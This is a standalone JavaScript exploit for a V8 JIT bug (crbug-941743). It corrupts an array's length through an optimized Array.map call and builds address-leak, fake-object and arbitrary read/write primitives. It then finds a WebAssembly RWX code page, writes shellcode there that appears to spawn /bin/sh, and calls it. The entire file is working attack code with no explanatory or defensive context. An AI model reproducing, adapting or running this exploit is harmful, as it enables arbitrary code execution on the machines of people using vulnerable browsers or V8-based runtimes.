/*

    exploit for crbug-941743

*/

is_in_v8_flag = true;

// =================================================================
// tookit
// =================================================================
var g_buffer = new ArrayBuffer(16);
var g_float64 = new Float64Array(g_buffer);
var g_uint64 = new BigUint64Array(g_buffer);


function float2address(f) {
  g_float64[0] = f;
  return g_uint64[0];
}


function address2float(addr) {
  let i = BigInt(addr);
  g_uint64[0] = i;
  return g_float64[0];
}


function hex(i) {
  return '0x' + i.toString(16).padStart('0');
}


function info(msg) {
  console.log('[+] ' + msg);
}

function error(msg) {
  console.log('[-] ' + msg);
  exit(1);
}

function gc() {
  for (let i = 0; i < 100; i++) {
    new ArrayBuffer(0x100000);
  }
}

function myprint(msg){
    if(is_in_v8_flag){
        print(msg);
    }else{
        console.log(msg);
    }
}


// =================================================================
// exploit part
// =================================================================

var max_iters = 10000;
var max_search = 0x10000;

Array(32760);

// This call ensures that TurboFan won't inline array constructors.
Array(2**30);
// Set up a fast holey smi array, and generate optimized code.
let a = [1, 2, ,,, 3];

let oob_array;
let leak_obj;
let rw_arraybuffer;
let obj = {}; //using for leak_obj

let oob_array_length_offset = 23;  // get this by debugging
let oob_array_storage_length_offset = oob_array_length_offset - 6;


function inline(){
    return a.map(
        (value, index) =>{
            if (index == 0){
                oob_array = [1.1, 2.2];

                leak_obj = {m:address2float(0xdeadbeef), n:obj};
                rw_arraybuffer = new ArrayBuffer(0x4321);
            }
            if (index == oob_array_length_offset +1 ){
                throw "oob finished..."
            }
            return index;
        });
}

inline();
for(var i = 0; i < max_iters; ++i) inline();

// Now lengthen the array, but ensure that it points to a non-dictionary
// backing store.
a.length = (32 * 1024 * 1024)-1;
a.fill(1, oob_array_storage_length_offset, oob_array_storage_length_offset + 1);
a.fill(1, oob_array_length_offset);
a.length += 500;


leak_obj_offset = 0;
rw_arraybuffer_offset = 0;

function addrOf(obj){
    leak_obj.n = obj;
    return Number(float2address(oob_array[leak_obj_offset]));
}

function fakeObj(obj_address){
    oob_array[leak_obj_offset] = Number(float2address(obj_address));
    return leak_obj.n;
}

function read64(addr){
    oob_array[rw_arraybuffer_offset] = address2float(addr);
    let data_view = new DataView(rw_arraybuffer);
    return Number(float2address(data_view.getFloat64(0, true)));
}

// function write64(addr, value){
//     oob_array[rw_arraybuffer_offset] = address2float(addr);
//     let data_view = new DataView(rw_arraybuffer);
//     data_view.setFloat64(0, float2address(value), true);
// }

function write32(addr, value){
    oob_array[rw_arraybuffer_offset] = address2float(addr);
    let data_view = new DataView(rw_arraybuffer);
    data_view.setInt32(0, value, true);
}

var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1,
127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0,
1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2,
0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 10, 11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var func = wasmInstance.exports.main;


try{
    inline();
}catch(e){
    if(oob_array.length > 2){
        myprint("[+] oob successed!");
        myprint("[+] oob_array length is : " + oob_array.length);
    }else{
        throw "oob Failed"
    }

    for(var i = 0; i < max_search; ++i){
        var value = float2address(oob_array[i]);
        if(value == 0xdeadbeef){
            leak_obj_offset = i + 1;
            break;
        }
    }

    for(var i = 0; i < max_search; ++i){
        var value = float2address(oob_array[i]);
        if(value == 0x4321){
            rw_arraybuffer_offset = i + 1;
            break;
        }
    }

    if(leak_obj_offset == 0 || rw_arraybuffer_offset==0) throw "get offset failed"

    myprint("[+] leak_obj_offset : " + leak_obj_offset);
    myprint("[+] rw_arraybuffer_offset : " + rw_arraybuffer_offset);

    var wasm_func_addr = addrOf(func) - 1;
    myprint("[+] wasm func addr : " + hex(wasm_func_addr));

    var shared_info = read64(wasm_func_addr + 0x18) - 1;
    myprint("[+] wasm shared info : " + hex(shared_info));

    var data_address = read64(shared_info + 0x8) - 1;
    myprint("[+] data_address : " + hex(data_address));

    var instance_address = read64(data_address + 0x10) - 1;
    myprint("[+] instance_address : " + hex(instance_address));

    var rwx_address = read64(instance_address + 0x108);
    myprint("[+] rwx_address : " + hex(rwx_address));
    // %DebugPrint(func);
    // %SystemBreak();

    write32(rwx_address, 0x99583b6a);
    write32(rwx_address + 0x4, 0x2fbb4852);
    write32(rwx_address + 0x8, 0x6e69622f);
    write32(rwx_address + 0xc, 0x5368732f);
    write32(rwx_address + 0x10, 0x57525f54);
    write32(rwx_address + 0x14, 0x050f5e54);

    // %SystemBreak();
    // let's go to the shellcode 
    func();

}

